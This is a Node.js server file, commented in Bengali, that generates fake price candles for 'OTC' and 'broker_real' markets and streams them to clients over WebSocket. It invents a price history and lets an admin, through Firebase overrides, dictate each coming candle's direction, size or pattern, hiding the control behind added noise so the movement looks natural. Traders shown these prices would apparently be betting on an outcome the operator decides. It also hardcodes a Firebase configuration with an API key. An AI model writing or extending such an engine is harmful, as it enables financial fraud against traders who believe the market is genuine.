// --- START: server.js (Perfect Math-Based Size & Strict Direction) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 250; // Fast ticks for smoothness
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const adminOverrides = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// Listen for Admin Commands
db.ref('admin/market_overrides').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    Object.keys(data).forEach(marketId => {
        adminOverrides[marketId] = data[marketId];
    });
});

// 🔥 PRE-CALCULATE EXACT TARGET OHLC (BASED ON YOUR EXACT MATH) 🔥
function generateTargetCandle(timestamp, openPrice, cmd, prevCandle) {
    let isGreen = Math.random() > 0.5;
    let baseVol = openPrice * 0.00005;
    
    // ১. আগের ক্যান্ডেলের সাইজ মাপা
    let prevBody = baseVol;
    if (prevCandle) {
        prevBody = Math.abs(prevCandle.close - prevCandle.open);
        // যদি আগের ক্যান্ডেল Doji বা খুব ছোট হয়, তবে একটি বেস সাইজ ধরা হবে যেন ক্যালকুলেশন কাজ করে
        if (prevBody < baseVol * 0.5) prevBody = baseVol; 
    }

    let body = baseVol * (0.8 + Math.random());
    let upWick = baseVol * Math.random();
    let dnWick = baseVol * Math.random();

    if (cmd) {
        const type = cmd.type;

        // ২. কালার ফিক্স করা (UP দিলে Green, DOWN দিলে Red)
        if (type.includes('UP')) isGreen = true;
        if (type.includes('DOWN')) isGreen = false;

        // ৩. আপনার বলা সাইজের অংক (Math) অনুযায়ী বডি তৈরি করা
        if (type.includes('INSIDE')) {
            // Small (আগেরটার চেয়ে ছোট): আগের বডির ৫০% থেকে ৭৫% হবে
            // উদাহরণ: আগে ৪০ থাকলে এখন ২০ থেকে ৩০ হবে
            body = prevBody * (0.50 + Math.random() * 0.25);
            upWick = body * 0.2; dnWick = body * 0.2;
        } 
        else if (type.includes('BREAKOUT')) {
            // Medium (আগেরটার চেয়ে বড়): আগের বডির ১২৫% থেকে ১৭৫% হবে
            // উদাহরণ: আগে ৪০ থাকলে এখন ৫০ থেকে ৭০ হবে
            body = prevBody * (1.25 + Math.random() * 0.50);
            upWick = body * 0.3; dnWick = body * 0.3;
        } 
        else if (type.includes('2X')) {
            // 2X Big (আগেরটার ডাবল): আগের বডির ঠিক ২০০% থেকে ২২০% হবে
            // উদাহরণ: আগে ৪০ থাকলে এখন ঠিক ৮০ থেকে ৮৮ হবে
            body = prevBody * (2.0 + Math.random() * 0.20);
            upWick = body * 0.5; dnWick = body * 0.5;
        } 
        else if (type === 'OPPOSITE_BREAKOUT') {
            // শুধু এই বাটনে কালার উল্টো হবে এবং ব্রেকআউট করবে
            if (prevCandle) isGreen = prevCandle.close < prevCandle.open;
            body = prevBody * (1.3 + Math.random() * 0.5); 
        } 
        else if (type.startsWith('PATTERN_')) {
            // প্যাটার্ন ড্রপডাউনের জন্য
            if (type === 'PATTERN_DOJI') {
                body = baseVol * 0.1; upWick = baseVol * 3; dnWick = baseVol * 3;
                isGreen = Math.random() > 0.5;
            } else if (type === 'PATTERN_MARUBOZU_GREEN') {
                isGreen = true; body = baseVol * 4; upWick = 0; dnWick = 0;
            } else if (type === 'PATTERN_MARUBOZU_RED') {
                isGreen = false; body = baseVol * 4; upWick = 0; dnWick = 0;
            } else if (type === 'PATTERN_HAMMER') {
                isGreen = true; body = baseVol * 1.5; upWick = 0; dnWick = baseVol * 3.5;
            } else if (type === 'PATTERN_SHOOTING_STAR') {
                isGreen = false; body = baseVol * 1.5; upWick = baseVol * 3.5; dnWick = 0;
            }
        }
    }

    // ৪. ফাইনাল প্রাইস ক্যালকুলেশন
    const close = isGreen ? openPrice + body : openPrice - body;
    const high = Math.max(openPrice, close) + upWick;
    const low = Math.min(openPrice, close) - dnWick;

    return { 
        timestamp, 
        open: roundPrice(openPrice), 
        close: roundPrice(close), 
        high: roundPrice(high), 
        low: roundPrice(low) 
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateTargetCandle(nowPeriod - (i * TIMEFRAME), currentPrice, null, null);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        targetCandle: null,
        currentNoise: 0
    };
}

function ensureTargetCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    
    if (!marketData.targetCandle || marketData.targetCandle.timestamp !== currentPeriod) {
        
        let overrideCmd = null;
        if (adminOverrides[marketData.marketId]) {
            const cmd = adminOverrides[marketData.marketId];
            if (currentPeriod >= cmd.targetTime && currentPeriod < cmd.targetTime + 60000) {
                overrideCmd = cmd;
                console.log(`[ADMIN CONTROL] Market: ${marketData.marketId}, Cmd: ${cmd.type}`);
            }
        }

        const target = generateTargetCandle(currentPeriod, lastCandle.close, overrideCmd, lastCandle);
        marketData.targetCandle = target;
        marketData.currentNoise = 0; 
        
        const newCandle = { timestamp: currentPeriod, open: target.open, high: target.open, low: target.open, close: target.open };
        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        
        marketData.currentPrice = target.open;
    }
}

// 🔥 SMOOTH INTERPOLATION WITH ZERO JUMP & 100% ACCURACY 🔥
function updatePriceSmoothly(marketData, currentPeriod) {
    const target = marketData.targetCandle;
    if (!target) return;

    const liveCandle = marketData.history[marketData.history.length - 1];
    const timeElapsed = Date.now() - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); 

    const expectedBasePath = target.open + ((target.close - target.open) * progress);
    
    const noiseMaxAllowed = Math.abs(target.close - target.open) * 0.15 * (1 - progress); 
    let tickDelta = (Math.random() - 0.5) * noiseMaxAllowed;
    
    marketData.currentNoise += tickDelta;

    if (Math.abs(marketData.currentNoise) > noiseMaxAllowed) {
        marketData.currentNoise *= 0.5;
    }

    if (progress > 0.1 && progress < 0.8 && Math.random() < 0.05) {
        if (Math.random() > 0.5) marketData.currentNoise = (target.high - expectedBasePath) * Math.random();
        else marketData.currentNoise = (target.low - expectedBasePath) * Math.random();
    }

    let newPrice = expectedBasePath + marketData.currentNoise;

    // 🛡️ HARD LOCK FOR THE LAST 3 SECONDS (No jumps, perfect close)
    if (progress >= 0.95) {
        newPrice = target.close;
    }

    marketData.currentPrice = newPrice;

    liveCandle.close = roundPrice(newPrice);
    liveCandle.high = roundPrice(Math.max(liveCandle.high, liveCandle.close, target.open));
    liveCandle.low = roundPrice(Math.min(liveCandle.low, liveCandle.close, target.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        ensureTargetCandle(marketData, currentPeriod);
        updatePriceSmoothly(marketData, currentPeriod);
        broadcastCandle(marketId, marketData.history[marketData.history.length - 1]);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: lastC.close, timestamp: lastC.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Strict Math-Based Engine V4 Running'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));